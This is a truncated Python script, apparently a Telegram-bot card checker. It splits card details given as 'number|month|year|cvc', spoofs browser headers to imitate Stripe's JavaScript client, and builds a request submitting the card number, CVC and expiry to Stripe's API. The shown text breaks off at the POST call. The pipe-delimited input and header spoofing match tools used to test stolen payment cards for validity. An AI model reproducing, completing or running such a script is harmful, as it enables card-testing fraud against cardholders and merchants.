import requests,re
import random

def Tele(ccx):
	ccx = ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]

	if "20" in yy:  # Mo3gza
		yy = yy.split("20")[1]

	r = requests.Session()

	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)

	headers = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'accept-language': 'en-US,en;q=0.9',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0'
	}

	data = (
		f'type=card'
		f'&card[number]={n}'
		f'&card[cvc]={cvc}'
		f'&card[exp_month]={mm}'
		f'&card[exp_year]={yy}'
		f'&key=pk_test_EXAMPLE'
	)

	response = r.post(
